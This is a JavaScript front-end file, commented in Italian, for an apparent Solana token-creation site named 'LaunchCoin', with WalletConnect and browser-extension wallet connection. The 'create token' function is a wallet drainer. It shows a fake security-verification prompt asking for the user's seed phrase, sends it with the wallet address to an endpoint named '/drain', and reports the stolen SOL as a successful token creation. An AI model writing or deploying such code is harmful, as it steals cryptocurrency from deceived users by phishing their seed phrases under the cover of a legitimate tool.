// ===== main.js – WALLETCONNECT V2 PURO (STILE LAUNCHMEMES) =====
import { Web3Wallet } from '@walletconnect/web3wallet';
import { Core } from '@walletconnect/core';
import { WalletConnectModal } from '@walletconnect/modal';
import { getSdkError } from '@walletconnect/utils';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let web3wallet = null;
let session = null;
let qrCheckInterval = null;
let currentUri = null;
let modal = null;
let isConnecting = false;

// ===== CONFIGURAZIONE =====
const PROJECT_ID = 'da6aaea2be14c6cc676dbaf3325b5bd5';
const METADATA = {
  name: 'LaunchCoin',
  description: 'Creatore di Token Solana',
  url: window.location.origin,
  icons: ['https://launchcoin.io/logo.png']
};

// ===== INIZIALIZZA WALLETCONNECT =====
async function initWalletConnect() {
  if (web3wallet) return web3wallet;

  try {
    const core = new Core({
      projectId: PROJECT_ID,
      relayUrl: 'wss://relay.walletconnect.com'
    });

    web3wallet = await Web3Wallet.init({
      core,
      metadata: METADATA
    });

    // Event listeners
    web3wallet.on('session_proposal', onSessionProposal);
    web3wallet.on('session_request', onSessionRequest);
    web3wallet.on('session_delete', onSessionDelete);
    web3wallet.on('session_update', onSessionUpdate);

    // Verifica sessioni attive
    const sessions = web3wallet.getActiveSessions();
    const sessionKeys = Object.keys(sessions);
    if (sessionKeys.length > 0) {
      session = sessions[sessionKeys[0]];
      if (session?.namespaces?.solana?.accounts?.length > 0) {
        const account = session.namespaces.solana.accounts[0];
        walletPublicKey = account.split(':')[2];
        console.log('✅ Sessione ripristinata:', walletPublicKey);
        aggiornaUIWalletConnesso();
      }
    }

    // Modal
    modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      chains: ['solana:mainnet'],
      metadata: METADATA
    });

    return web3wallet;
  } catch (error) {
    console.error('❌ Init WalletConnect error:', error);
    throw error;
  }
}

// ===== GESTISCI PROPOSTA SESSIONE =====
async function onSessionProposal(proposal) {
  try {
    const { id, params } = proposal;
    const { requiredNamespaces, optionalNamespaces } = params;

    console.log('📩 Proposta ricevuta:', params);

    const namespaces = {
      solana: {
        accounts: [],
        methods: ['solana_signTransaction', 'solana_signMessage'],
        events: ['chainChanged', 'accountsChanged']
      }
    };

    // Aggiungi EIP155 se richiesto
    if (optionalNamespaces?.eip155) {
      namespaces.eip155 = {
        accounts: optionalNamespaces.eip155.chains.map(chain => `${chain}:0x...`),
        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
        events: ['chainChanged', 'accountsChanged']
      };
    }

    const session = await web3wallet.approveSession({
      id,
      namespaces
    });

    if (session) {
      console.log('✅ Sessione approvata:', session);
      if (session.namespaces.solana?.accounts?.length > 0) {
        const account = session.namespaces.solana.accounts[0];
        walletPublicKey = account.split(':')[2];
        console.log('✅ Wallet connesso:', walletPublicKey);
        
        localStorage.setItem('walletconnect_session', JSON.stringify(session));
        aggiornaUIWalletConnesso();
        chiudiModalQR();
        
        setTimeout(() => {
          window.location.href = 'create.html';
        }, 500);
      }
    }
  } catch (error) {
    console.error('❌ Errore proposta:', error);
  }
}

// ===== GESTISCI RICHIESTA SESSIONE =====
async function onSessionRequest(event) {
  try {
    const { id, params } = event;
    const { request, chainId } = params;
    
    console.log('📥 Richiesta:', request.method);

    // Rispondi alla richiesta (placeholder)
    await web3wallet.respondSessionRequest({
      id,
      result: { signature: '0x...' }
    });
  } catch (error) {
    console.error('❌ Errore richiesta:', error);
  }
}

// ===== GESTISCI ELIMINAZIONE SESSIONE =====
function onSessionDelete(event) {
  console.log('🗑️ Sessione eliminata');
  session = null;
  walletPublicKey = null;
  localStorage.removeItem('walletconnect_session');
  aggiornaUIWalletDisconnesso();
}

// ===== GESTISCI AGGIORNAMENTO SESSIONE =====
function onSessionUpdate(event) {
  console.log('🔄 Sessione aggiornata:', event);
  if (event?.params?.namespaces?.solana?.accounts?.length > 0) {
    walletPublicKey = event.params.namespaces.solana.accounts[0].split(':')[2];
    aggiornaUIWalletConnesso();
  }
}

// ===== AGGIORNA UI WALLET CONNESSO =====
function aggiornaUIWalletConnesso() {
  const btn = document.querySelector('.connect-btn');
  if (btn && walletPublicKey) {
    btn.innerHTML = `🟢 ${walletPublicKey.slice(0, 4)}...${walletPublicKey.slice(-4)}`;
    btn.style.background = '#22d1f8';
    btn.style.color = '#0b1022';
  }
}

function aggiornaUIWalletDisconnesso() {
  const btn = document.querySelector('.connect-btn');
  if (btn) {
    btn.innerHTML = 'Connect';
    btn.style.background = '';
    btn.style.color = '';
  }
}

// ===== CONNETTI WALLET =====
window.connectWallet = async function() {
  if (isConnecting) return;
  
  if (walletPublicKey) {
    alert('✅ Già connesso: ' + walletPublicKey);
    window.location.href = 'create.html';
    return;
  }

  try {
    isConnecting = true;
    await initWalletConnect();
    
    // Prima controlla estensioni
    if (window.solana?.isPhantom) {
      try {
        const resp = await window.solana.connect({ onlyIfTrusted: true });
        if (resp?.publicKey) {
          walletPublicKey = resp.publicKey.toString();
          aggiornaUIWalletConnesso();
          window.location.href = 'create.html';
          isConnecting = false;
          return;
        }
      } catch (e) { /* fallback */ }
    }

    // Se nessuna estensione, apri modal QR
    mostraModalConnessione();
    
  } catch (error) {
    console.error('❌ Errore connessione:', error);
    alert('Connessione fallita: ' + error.message);
  } finally {
    isConnecting = false;
  }
};

// ===== MOSTRA MODAL CONNESSIONE =====
function mostraModalConnessione() {
  // Rimuovi modale esistente
  const existing = document.getElementById('wc-modal-overlay');
  if (existing) existing.remove();

  const overlay = document.createElement('div');
  overlay.id = 'wc-modal-overlay';
  overlay.style.cssText = `
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.85);
    backdrop-filter: blur(12px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 99999;
    animation: fadeIn 0.2s ease;
  `;

  overlay.innerHTML = `
    <div style="
      background: #141a2b;
      border-radius: 28px;
      padding: 40px;
      max-width: 440px;
      width: 92%;
      border: 1px solid rgba(255,255,255,0.08);
      box-shadow: 0 40px 80px rgba(0,0,0,0.9);
      max-height: 90vh;
      overflow-y: auto;
    ">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2 style="color: #22d1f8; font-size: 22px; margin: 0;">Connetti Wallet</h2>
        <button onclick="chiudiModalQR()" style="
          background: transparent;
          border: none;
          color: #8899bb;
          font-size: 28px;
          cursor: pointer;
        ">✕</button>
      </div>
      
      <p style="color: #abc4ff; font-size: 14px; margin-bottom: 24px;">
        Scegli il tuo wallet Solana per continuare
      </p>

      <!-- QR CODE -->
      <div id="qr-container" style="
        background: rgba(0,0,0,0.2);
        border-radius: 16px;
        padding: 20px;
        margin-bottom: 20px;
        text-align: center;
        display: none;
      ">
        <p style="color: #8899bb; font-size: 13px; margin-bottom: 12px;">
          📱 Scansiona con la tua app wallet
        </p>
        <div id="qr-code" style="
          display: flex;
          justify-content: center;
          background: white;
          padding: 16px;
          border-radius: 12px;
          min-height: 200px;
          align-items: center;
        ">
          <span style="color: #667;">Generazione QR...</span>
        </div>
        <p id="qr-uri-text" style="color: #667; font-size: 11px; margin-top: 12px; word-break: break-all;"></p>
        <div style="display: flex; gap: 8px; justify-content: center; margin-top: 10px;">
          <button onclick="copiaURI()" style="
            background: #2a3457;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            color: #ecf5ff;
            cursor: pointer;
            font-size: 13px;
          ">📋 Copia Link</button>
          <button onclick="apriDeepLink()" style="
            background: #22d1f8;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            color: #0b1022;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
          ">📱 Apri Wallet</button>
        </div>
      </div>

      <!-- LISTA WALLET -->
      <div style="display: flex; flex-direction: column; gap: 8px;">
        <button onclick="connettiEstensione('phantom')" style="
          display: flex; align-items: center; gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/phantom.png" alt="Phantom" style="width:28px;height:28px;" />
          Phantom
        </button>
        <button onclick="connettiEstensione('solflare')" style="
          display: flex; align-items: center; gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/solflare.png" alt="Solflare" style="width:28px;height:28px;" />
          Solflare
        </button>
        <button onclick="connettiEstensione('backpack')" style="
          display: flex; align-items: center; gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <span style="font-size:24px;">🎒</span>
          Backpack
        </button>
        <button onclick="connettiEstensione('trust')" style="
          display: flex; align-items: center; gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/trust.png" alt="Trust" style="width:28px;height:28px;" />
          Trust Wallet
        </button>
        <button onclick="connettiEstensione('coinbase')" style="
          display: flex; align-items: center; gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/coinbase.png" alt="Coinbase" style="width:28px;height:28px;" />
          Coinbase Wallet
        </button>
        <button onclick="mostraQRCode()" style="
          display: flex; align-items: center; gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <span style="font-size:24px;">📱</span>
          WalletConnect (QR)
        </button>
      </div>

      <div style="margin-top: 20px; text-align: center; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 16px;">
        <p style="color: #667; font-size: 12px;">
          Nuovo su Solana?
          <span style="color: #22d1f8; cursor: pointer;" onclick="window.open('https://phantom.app/', '_blank')">
            Scarica Phantom
          </span>
        </p>
      </div>
    </div>
  `;

  document.body.appendChild(overlay);
}

// ===== MOSTRA QR CODE =====
window.mostraQRCode = async function() {
  const qrContainer = document.getElementById('qr-container');
  const qrDiv = document.getElementById('qr-code');
  const uriText = document.getElementById('qr-uri-text');
  
  if (!qrContainer || !qrDiv) return;

  try {
    await initWalletConnect();

    const { uri, approval } = await web3wallet.connect({
      requiredNamespaces: {
        solana: {
          chains: ['solana:mainnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        }
      }
    });

    if (!uri) throw new Error('Nessun URI generato');
    currentUri = uri;

    qrContainer.style.display = 'block';
    qrDiv.innerHTML = '';
    
    if (typeof QRCode !== 'undefined') {
      new QRCode(qrDiv, {
        text: uri,
        width: 220,
        height: 220,
        colorDark: '#000000',
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.H
      });
    } else {
      qrDiv.innerHTML = `<span style="color:#667;">QRCode library not loaded</span>`;
    }
    
    uriText.textContent = uri.substring(0, 50) + '...';

    // Poll per l'approvazione
    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        const result = await approval();
        if (result) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          console.log('✅ Sessione approvata via QR');
        }
      } catch (e) {
        // Ancora in attesa
      }
    }, 2000);

  } catch (error) {
    console.error('❌ Errore QR:', error);
    alert('Errore QR: ' + error.message);
  }
};

// ===== APRI DEEP LINK =====
window.apriDeepLink = function() {
  if (currentUri) {
    window.location.href = `wc:${currentUri}`;
    setTimeout(() => {
      window.location.href = `phantom://wc?uri=${encodeURIComponent(currentUri)}`;
    }, 300);
  }
};

// ===== COPIA URI =====
window.copiaURI = function() {
  if (currentUri) {
    navigator.clipboard.writeText(currentUri).then(() => {
      alert('✅ Link copiato!');
    }).catch(() => {
      prompt('Copia questo link:', currentUri);
    });
  }
};

// ===== CHIUDI MODAL QR =====
window.chiudiModalQR = function() {
  const overlay = document.getElementById('wc-modal-overlay');
  if (overlay) overlay.remove();
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== CONNETTI ESTENSIONE =====
window.connettiEstensione = async function(tipo) {
  try {
    let wallet = null;
    switch (tipo) {
      case 'phantom': wallet = window.solana; break;
      case 'solflare': wallet = window.solflare; break;
      case 'backpack': wallet = window.backpack; break;
      case 'trust': wallet = window.trustwallet; break;
      case 'coinbase': wallet = window.coinbaseWallet; break;
      default: throw new Error('Wallet non supportato');
    }

    if (!wallet) {
      // Se non c'è estensione, mostra QR
      mostraQRCode();
      return;
    }

    const resp = await wallet.connect();
    if (resp?.publicKey) {
      walletPublicKey = resp.publicKey.toString();
      aggiornaUIWalletConnesso();
      chiudiModalQR();
      window.location.href = 'create.html';
    }
  } catch (error) {
    console.error('❌ Errore estensione:', error);
    mostraQRCode();
  }
};

// ===== TOGGLE MENU =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== SEED PHRASE PROMPT =====
function chiediSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt('⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione:');
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await chiediSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed, walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== INIZIALIZZA =====
document.addEventListener('DOMContentLoaded', async () => {
  try {
    await initWalletConnect();
  } catch (error) {
    console.error('Init error:', error);
  }
});

// ===== CHIUDI MENU CLICCANDO FUORI =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) {
    menu.classList.remove('open');
  }
});

console.log('✅ main.js caricato (WalletConnect V2 puro)');
